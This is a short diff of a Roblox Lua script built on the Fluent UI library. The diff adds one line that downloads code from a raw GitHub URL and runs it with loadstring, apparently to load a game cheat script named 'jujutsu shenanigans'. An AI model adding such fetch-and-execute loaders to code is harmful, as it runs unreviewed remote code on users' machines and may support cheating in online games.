@@ -9,6 +9,8 @@ local Window = Fluent:CreateWindow({
     MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
 })
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PolarCheem/duck/main/jujutsu%20shenanigans"))()
+
 local Options = Fluent.Options
 
 -- Fluent provides Lucide Icons, they are optional
